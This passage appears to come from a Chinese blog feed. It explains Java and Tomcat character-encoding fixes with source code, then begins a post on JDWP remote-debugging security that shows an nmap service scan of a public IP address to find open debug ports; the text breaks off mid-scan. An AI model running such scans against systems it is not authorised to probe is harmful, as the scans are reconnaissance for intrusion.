class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Creates an OutputStreamWriter that uses the default character encoding.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  out  An OutputStream</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">OutputStreamWriter</span><span class="params">(OutputStream out)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>(out);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        se = StreamEncoder.forOutputStreamWriter(out, <span class="keyword">this</span>, (String)<span class="keyword">null</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> Error(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看<code>StreamEncoder</code>的<code>forOutputStreamWriter</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Factories for java.io.OutputStreamWriter</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> StreamEncoder <span class="title">forOutputStreamWriter</span><span class="params">(OutputStream out,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                      Object lock,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                      String charsetName)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> UnsupportedEncodingException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        String csn = charsetName;</span><br><span class="line">        <span class="keyword">if</span> (csn == <span class="keyword">null</span>)</span><br><span class="line">            csn = Charset.defaultCharset().name();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (Charset.isSupported(csn))</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> StreamEncoder(out, lock, Charset.forName(csn));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalCharsetNameException x) &#123; &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> UnsupportedEncodingException (csn);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以看到， 如果没有传入编码名称，用的是默认的编码方式，这个<code>Charset.defaultCharset().name()</code>在windows上默认是<code>GBK</code>，这个可以在<code>JDK</code>启动的时候指定参数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-Dfile.encoding=UTF-8</span><br></pre></td></tr></table></figure><h1 id="Tomcat乱码"><a href="#Tomcat乱码" class="headerlink" title="Tomcat乱码"></a>Tomcat乱码</h1><h2 id="URI编码"><a href="#URI编码" class="headerlink" title="URI编码"></a>URI编码</h2><p>指定为<code>UTF-8</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Connector</span> <span class="attr">port</span>=<span class="string">"8080"</span> <span class="attr">maxThreads</span>=<span class="string">"150"</span> <span class="attr">minSpareThreads</span>=<span class="string">"25"</span> </span></span><br><span class="line"><span class="tag"><span class="attr">maxSpareThreads</span>=<span class="string">"75"</span> <span class="attr">enableLookups</span>=<span class="string">"false"</span> <span class="attr">redirectPort</span>=<span class="string">"8443"</span> </span></span><br><span class="line"><span class="tag"><span class="attr">acceptCount</span>=<span class="string">"100"</span> <span class="attr">debug</span>=<span class="string">"99"</span> <span class="attr">connectionTimeout</span>=<span class="string">"20000"</span> </span></span><br><span class="line"><span class="tag"><span class="attr">disableUploadTimeout</span>=<span class="string">"true"</span> <span class="attr">URIEncoding</span>=<span class="string">"UTF-8"</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>tomcat 对URI默认的编码是<code>ISO-8859-1</code>，在<code>Connector</code>中配置<strong>URIEncoding=”UTF-8”</strong> 就可以指定编码。</p><p>tomcat中关于编码的代码:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.apache.catalina.connector.CoyoteAdapter#convertURI</span></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Character conversion of the URI.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">convertURI</span><span class="params">(MessageBytes uri, Request request)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        ByteChunk bc = uri.getByteChunk();</span><br><span class="line">        <span class="keyword">int</span> length = bc.getLength();</span><br><span class="line">        CharChunk cc = uri.getCharChunk();</span><br><span class="line">        cc.allocate(length, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        String enc = connector.getURIEncoding();</span><br><span class="line">        <span class="keyword">if</span> (enc != <span class="keyword">null</span>) &#123;</span><br><span class="line">            B2CConverter conv = request.getURIConverter();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (conv == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    conv = <span class="keyword">new</span> B2CConverter(enc, <span class="keyword">true</span>);</span><br><span class="line">                    request.setURIConverter(conv);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    conv.recycle();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                log.error(<span class="string">"Invalid URI encoding; using HTTP default"</span>);</span><br><span class="line">                connector.setURIEncoding(<span class="keyword">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (conv != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    conv.convert(bc, cc, <span class="keyword">true</span>);</span><br><span class="line">                    uri.setChars(cc.getBuffer(), cc.getStart(), cc.getLength());</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException ioe) &#123;</span><br><span class="line">                    <span class="comment">// Should never happen as B2CConverter should replace</span></span><br><span class="line">                    <span class="comment">// problematic characters</span></span><br><span class="line">                    request.getResponse().sendError(</span><br><span class="line">                            HttpServletResponse.SC_BAD_REQUEST);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Default encoding: fast conversion for ISO-8859-1</span></span><br><span class="line">        <span class="keyword">byte</span>[] bbuf = bc.getBuffer();</span><br><span class="line">        <span class="keyword">char</span>[] cbuf = cc.getBuffer();</span><br><span class="line">        <span class="keyword">int</span> start = bc.getStart();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">            cbuf[i] = (<span class="keyword">char</span>) (bbuf[i + start] &amp; <span class="number">0xff</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        uri.setChars(cbuf, <span class="number">0</span>, length);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="Request的编码"><a href="#Request的编码" class="headerlink" title="Request的编码"></a>Request的编码</h2><p>设置了上述编码后，获取request的参数还是有可能乱码， 此时需要指定对应的filter。</p><h2 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h2><p>tomcat中也实现了一个编码的filter：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.apache.catalina.filters.SetCharacterEncodingFilter</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Select and set (if specified) the character encoding to be used to</span></span><br><span class="line"><span class="comment">     * interpret request parameters for this request.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> request The servlet request we are processing</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> response The servlet response we are creating</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> chain The filter chain we are processing</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@exception</span> IOException if an input/output error occurs</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@exception</span> ServletException if a servlet error occurs</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest request, ServletResponse response,</span></span></span><br><span class="line"><span class="function"><span class="params">                         FilterChain chain)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Conditionally select and set the character encoding to be used</span></span><br><span class="line">        <span class="keyword">if</span> (ignore || (request.getCharacterEncoding() == <span class="keyword">null</span>)) &#123;</span><br><span class="line">            String characterEncoding = selectEncoding(request);</span><br><span class="line">            <span class="keyword">if</span> (characterEncoding != <span class="keyword">null</span>) &#123;</span><br><span class="line">                request.setCharacterEncoding(characterEncoding);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Pass control on to the next filter</span></span><br><span class="line">        chain.doFilter(request, response);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在<code>web.xml</code>中的配置：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>SetCharacterEncoding<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>filters.SetCharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>encoding<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>GBK<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>SetCharacterEncoding<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="SpringMVC"><a href="#SpringMVC" class="headerlink" title="SpringMVC"></a>SpringMVC</h2><p>在spring mvc中可以做如下的配置：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>encodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.springframework.web.filter.CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>encoding<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>forceEncoding<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">async-supported</span>&gt;</span>true<span class="tag">&lt;/<span class="name">async-supported</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>encodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><p>一定要配置成<strong>第一个</strong><code>filter</code>，否则还是不会生效。</p><p>它的实现也很简单：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.springframework.web.filter.CharacterEncodingFilter#doFilterInternal</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doFilterInternal</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">            HttpServletRequest request, HttpServletResponse response, FilterChain filterChain)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">        String encoding = getEncoding();</span><br><span class="line">        <span class="keyword">if</span> (encoding != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (isForceRequestEncoding() || request.getCharacterEncoding() == <span class="keyword">null</span>) &#123;</span><br><span class="line">                request.setCharacterEncoding(encoding);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (isForceResponseEncoding()) &#123;</span><br><span class="line">                response.setCharacterEncoding(encoding);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        filterChain.doFilter(request, response);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>setCharacterEncoding</code>是Servlet规范中定义的方法， 看下<code>tomcat</code>的实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.apache.catalina.core.ApplicationHttpRequest#mergeParameters</span></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Merge the parameters from the saved query parameter string (if any), and</span></span><br><span class="line"><span class="comment">     * the parameters already present on this request (if any), such that the</span></span><br><span class="line"><span class="comment">     * parameter values from the query string show up first if there are</span></span><br><span class="line"><span class="comment">     * duplicate parameter names.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">mergeParameters</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((queryParamString == <span class="keyword">null</span>) || (queryParamString.length() &lt; <span class="number">1</span>))</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        HashMap&lt;String, String[]&gt; queryParameters = <span class="keyword">new</span> HashMap&lt;String, String[]&gt;();</span><br><span class="line">        String encoding = getCharacterEncoding();</span><br><span class="line">        <span class="keyword">if</span> (encoding == <span class="keyword">null</span>)</span><br><span class="line">            encoding = <span class="string">"ISO-8859-1"</span>;</span><br><span class="line">        RequestUtil.parseParameters(queryParameters, queryParamString,</span><br><span class="line">                encoding);</span><br><span class="line">        Iterator&lt;String&gt; keys = parameters.keySet().iterator();</span><br><span class="line">        <span class="keyword">while</span> (keys.hasNext()) &#123;</span><br><span class="line">            String key = keys.next();</span><br><span class="line">            Object value = queryParameters.get(key);</span><br><span class="line">            <span class="keyword">if</span> (value == <span class="keyword">null</span>) &#123;</span><br><span class="line">                queryParameters.put(key, parameters.get(key));</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            queryParameters.put</span><br><span class="line">                (key, mergeValues(value, parameters.get(key)));</span><br><span class="line">        &#125;</span><br><span class="line">        parameters = queryParameters;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以看到默认的编码是<code>&quot;ISO-8859-1&quot;</code>, 为什么要设置成第一个filter呢，找到调用的地方看：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.apache.catalina.core.ApplicationHttpRequest#parseParameters</span></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Parses the parameters of this request.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * If parameters are present in both the query string and the request</span></span><br><span class="line"><span class="comment">     * content, they are merged.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">parseParameters</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (parsedParams) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        parameters = <span class="keyword">new</span> HashMap&lt;String, String[]&gt;();</span><br><span class="line">        parameters = copyMap(getRequest().getParameterMap());</span><br><span class="line">        mergeParameters();</span><br><span class="line">        parsedParams = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以看到，<code>parseParameters</code>只会调用一次，如果在前面的<code>filter</code>中尝试获取<code>Parameters</code>中的参数，这个tomcat就会用默认的编码去解析传入的参数了。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li><a href="https://blog.csdn.net/u010001043/article/details/53203576" rel="external nofollow noopener noreferrer" target="_blank">UrlConnection post请求中文参数乱码问题 - CSDN博客</a></li><li><a href="https://blog.csdn.net/huangshaotian/article/details/7472662" rel="external nofollow noopener noreferrer" target="_blank">设置Java JDK的默认编码为UTF-8 - CSDN博客</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;URLConnection-乱码&quot;&gt;&lt;a href=&quot;#URLConnection-乱码&quot; class=&quot;headerlink&quot; title=&quot;URLConnection 乱码&quot;&gt;&lt;/a&gt;URLConnection 乱码&lt;/h1&gt;&lt;figure class=&quot;hi
      
    
    </summary>
    
      <category term="java" scheme="http://qsli.github.io/categories/java/"/>
    
    
      <category term="encoding" scheme="http://qsli.github.io/tags/encoding/"/>
    
  </entry>
  
  <entry>
    <title>jdwp远程调试与安全</title>
    <link href="http://qsli.github.io/2018/08/12/jdwp/"/>
    <id>http://qsli.github.io/2018/08/12/jdwp/</id>
    <published>2018-08-11T22:12:16.000Z</published>
    <updated>2018-08-11T22:12:16.670Z</updated>
    
    <content type="html"><![CDATA[<h1 id="什么是JDWP？"><a href="#什么是JDWP？" class="headerlink" title="什么是JDWP？"></a>什么是JDWP？</h1><blockquote><p>JDWP（Java Debug Wire Protocol）是一个为 Java 调试而设计的一个通讯交互协议，它定义了调试器和被调试程序之间<strong>传递的信息的格式</strong>。在 JPDA 体系中，作为前端（front-end）的调试者（debugger）进程和后端（back-end）的被调试程序（debuggee）进程之间的交互数据的格式就是由 JDWP 来描述的，它详细完整地定义了请求命令、回应数据和错误代码，保证了前端和后端的 JVMTI 和 JDI 的通信通畅。比如在 Sun 公司提供的实现中，它提供了一个名为 jdwp.dll（jdwp.so）的动态链接库文件，这个动态库文件实现了一个 Agent，它会负责解析前端发出的请求或者命令，并将其转化为 JVMTI 调用，然后将 JVMTI 函数的返回值封装成 JDWP 数据发还给后端。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Components                          Debugger Interfaces</span><br><span class="line"></span><br><span class="line">                /    |--------------|</span><br><span class="line">               /     |     VM       |</span><br><span class="line"> debuggee ----(      |--------------|  &lt;------- JVM TI - Java VM Tool Interface</span><br><span class="line">               \     |   back-end   |</span><br><span class="line">                \    |--------------|</span><br><span class="line">                /           |</span><br><span class="line"> comm channel -(            |  &lt;--------------- JDWP - Java Debug Wire Protocol</span><br><span class="line">                \           |</span><br><span class="line">                     |--------------|</span><br><span class="line">                     | front-end    |</span><br><span class="line">                     |--------------|  &lt;------- JDI - Java Debug Interface</span><br><span class="line">                     |      UI      |</span><br><span class="line">                     |--------------|</span><br></pre></td></tr></table></figure><p><a href="https://docs.oracle.com/javase/8/docs/technotes/guides/jpda/architecture.html#jvmti" rel="external nofollow noopener noreferrer" target="_blank">JVM TI</a> -<strong>Java VM Tool Interface</strong></p><p>Defines the debugging services a VM provides.</p><p><a href="https://docs.oracle.com/javase/8/docs/technotes/guides/jpda/architecture.html#jdwp" rel="external nofollow noopener noreferrer" target="_blank">JDWP</a> - <strong>Java Debug Wire Protocol</strong></p><p>Defines the communication between <a href="https://docs.oracle.com/javase/8/docs/technotes/guides/jpda/architecture.html#debuggee" rel="external nofollow noopener noreferrer" target="_blank">debuggee</a> and debugger processes.</p><p><a href="https://docs.oracle.com/javase/8/docs/technotes/guides/jpda/architecture.html#jdi" rel="external nofollow noopener noreferrer" target="_blank">JDI</a> - <strong>Java Debug Interface</strong></p><p>Defines a high-level Java language interface which tool developers can easily use to write remote debugger applications.</p><h1 id="发现开启了JDWP的端口"><a href="#发现开启了JDWP的端口" class="headerlink" title="发现开启了JDWP的端口"></a>发现开启了JDWP的端口</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><p><code>nmap</code>是端口扫描的利器，支持批量扫描网段内端口打开的情况。通过<code>nmap</code>的扫描可以找到端口和对应的协议，这样就可以扫描到打开了远程debug的端口的机器。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">➜  ~  sudo nmap -sV 221.221.221.221</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-10 12:12 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> izbp16k6k2yv9vvh6c3v65zi (221.221.221.221)</span><br><span class="line">Host is up (0.033s latency).</span><br><span class="line">Not shown: 972 closed ports</span><br><span class="line">PORT      STATE    SERVICE        VERSION</span><br><span class="line">22/tcp    open     ssh            OpenSSH 7.4 (protocol 2.0)</span><br><span class="line">42/tcp    filtered nameserver</span><br><span class="line">80/tcp    open     http           nginx 1.10.2</span><br><span class="line">111/tcp   open     rpcbind        2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">135/tcp   filtered msrpc</span><br><span class="line">139/tcp   filtered netbios-ssn</span><br><span class="line">443/tcp   open     ssl/http       nginx 1.10.2</span><br><span class="line">445/tcp   filtered microsoft-ds</span><br><span class="line">593/tcp   filtered http-rpc-epmap</span><br><span class="line">901/tcp   filtered samba-swat</span><br><span class="line">1068/tcp  filtered instl_bootc</span><br><span class="line">3128/tcp  filtered squid-http</span><br><span class="line">3333/tcp  filtered dec-notes</span><br><span class="line">3690/tcp  open     svnserve       Subversion</span><br><span class="line">4444/tcp  filtered krb524</span><br><span class="line">5800/tcp  filtered vnc-http</span><br><span class="line">5900/tcp  filtered vnc</span><br><span class="line">6129/tcp  filtered unknown</span><br><span class="line">6667/tcp  filtered irc</span><br><span class="line">7070/tcp  open     http           nginx 1.10.3</span><br><span class="line">8081/tcp  open     http           Apache Tomcat 8.5.13</span><br><span class="line">8180/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">8181/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">9001/tcp  open     http           Apache Tomcat/Coyote JSP engine 